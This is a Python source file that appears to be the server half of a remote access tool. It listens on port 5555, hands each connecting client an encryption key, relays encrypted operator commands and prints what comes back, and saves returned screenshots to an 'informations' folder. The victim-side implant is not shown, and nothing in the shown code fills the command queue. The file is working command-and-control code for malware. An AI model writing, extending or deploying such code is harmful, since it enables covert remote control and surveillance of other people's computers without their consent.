import sys
import os
import socket
from datetime import datetime
import queue
import threading

current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

from message import CryptoManager

HOST = "0.0.0.0"
PORT = 5555

os.makedirs("informations", exist_ok=True)
cmd_queue = queue.Queue()


def recv_all(sock, crypto: CryptoManager) -> bytes:
    buffer = b""
    while True:
        part = sock.recv(4096)
        if not part:
            break
        buffer += part
        try:
            return crypto.decrypt(buffer)
        except:
            continue
    return b""


def handle_client(client, addr):
    print(f"[+] Handling connection from {addr}")

    crypto = CryptoManager()
    client.send(crypto.get_key())

    while True:
        try:
            try:
                command = cmd_queue.get(timeout=0.1)
            except queue.Empty:
                continue

            if not command:
                continue
            if command.lower() == "exit":
                client.send(crypto.encrypt(command.encode()))
                break

            client.send(crypto.encrypt(command.encode()))
            data = recv_all(client, crypto)

            if command.lower() == "screenshot" and data:
                filename = datetime.now().strftime("informations/screenshot_%Y%m%d_%H%M%S.png")
                with open(filename, "wb") as f:
                    f.write(data)
                print(f"[+] Screenshot saved as {filename}")
            else:
                print(data.decode("utf-8", errors="replace"))

        except Exception as e:
            print(f"[!] Error handling client: {e}")
            break


def run_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[+] Server listening on {HOST}:{PORT}")

    try:
        while True:
            client, addr = server.accept()
            print(f"[+] Connection from {addr}")

            client_thread = threading.Thread(target=handle_client, args=(client, addr))
            client_thread.daemon = True
            client_thread.start()

    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")
    finally:
        server.close()


if __name__ == "__main__":
    run_server()